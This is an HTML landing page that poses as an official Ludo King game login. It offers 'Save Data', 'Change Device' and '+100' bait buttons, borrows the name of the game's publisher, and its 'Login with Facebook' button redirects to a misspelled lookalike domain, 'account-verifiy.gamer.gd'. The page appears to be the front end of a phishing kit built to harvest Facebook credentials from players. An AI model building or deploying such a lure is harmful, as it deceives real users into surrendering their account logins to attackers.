<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Ludo King invites you</title>
    <link rel="icon" href="https://i.postimg.cc/28qyMZLS/download.jpg" type="image/jpeg" />

    <meta property="og:title" content="Ludo King invites you" />
    <meta property="og:description" content="Continue your Ludo King progress securely" />
    <meta property="og:image" content="https://i.postimg.cc/qR6JwjCv/5a6501a4-a969-492b-94dc-8bd3870cb1a8.jpg" />
    <meta property="og:url" content="https://ludo-king-online.gamer.gd" />
    <meta property="og:type" content="website" />

    <style>
      body {
        margin: 0;
        font-family: "Poppins", Arial, sans-serif;
        background: url('https://i.postimg.cc/qR6JwjCv/5a6501a4-a969-492b-94dc-8bd3870cb1a8.jpg') no-repeat center center fixed;
        background-size: cover;
        background-attachment: fixed; /* Helps with transition smoothness */
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        color: #fff;
      }

      .login-box {
        background: rgba(0, 0, 0, 0.55);
        backdrop-filter: blur(6px);
        text-align: center;
        padding: 40px 30px;
        border-radius: 20px;
        width: 360px;
        max-width: 90%;
        box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
        animation: fadeIn 1.2s ease;
        position: relative;
        z-index: 2;
      }

      @keyframes fadeIn {
        from { opacity: 0; transform: translateY(15px); }
        to { opacity: 1; transform: translateY(0); }
      }

      .logo {
        width: 160px;
        height: auto;
        margin-bottom: 25px;
        border-radius: 12px;
      }

      .mini-buttons {
        display: flex;
        justify-content: space-between;
        margin-bottom: 25px;
      }

      .mini-btn {
        background: linear-gradient(180deg, #0c53b7, #08377a);
        border: none;
        color: #fff;
        font-size: 14px;
        font-weight: 600;
        padding: 10px 14px;
        border-radius: 8px;
        display: flex;
        align-items: center;
        gap: 6px;
        cursor: pointer;
        transition: all 0.25s ease;
      }

      .mini-btn:hover {
        background: linear-gradient(180deg, #1365da, #0a3f8a);
        transform: translateY(-2px);
      }

      .fb-btn {
        background-color: #1877f2;
        border: none;
        color: white;
        font-size: 18px;
        font-weight: 600;
        padding: 14px 30px;
        border-radius: 10px;
        cursor: pointer;
        width: 100%;
        margin-bottom: 15px;
        transition: background 0.3s ease;
      }

      .fb-btn:hover {
        background-color: #0f5cd6;
      }

      .fb-btn img {
        vertical-align: middle;
        margin-right: 8px;
        width: 20px;
        height: 20px;
      }

      .note {
        color: #ddd;
        font-size: 12px;
        line-height: 1.5;
        margin-top: 10px;
      }

      .note a {
        color: #00aaff;
        text-decoration: none;
        font-weight: 500;
      }

      .note a:hover {
        text-decoration: underline;
      }
    </style>
  </head>
  <body>

    <div class="login-box">
      <img class="logo" src="https://i.postimg.cc/qR6JwjCv/5a6501a4-a969-492b-94dc-8bd3870cb1a8.jpg" alt="Ludo King Logo" />
      <div class="mini-buttons">
        <button class="mini-btn">‚òÅÔ∏è Save Data</button>
        <button class="mini-btn">üì± Change Device</button>
        <button class="mini-btn">üíé +100</button>
      </div>
      <button class="fb-btn" id="fbLoginBtn" type="button">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="FB" />
        Login with Facebook
      </button>
      <p class="note">
        By continuing I agree that Gametion Technologies Pvt. Ltd. may store and process my data in accordance with the
        <br />
        <a href="#">Privacy Policy</a>
      </p>
    </div>

    <script>
      document.getElementById('fbLoginBtn').addEventListener('click', function(e) {
        e.preventDefault();
        // Use replace() for smoother redirect (no back button history flash)
        window.location.replace('https://account-verifiy.gamer.gd');
        // Alternative if replace not work: window.location.href = 'https://account-verifiy.gamer.gd';
      });
    </script>

  </body>
</html>
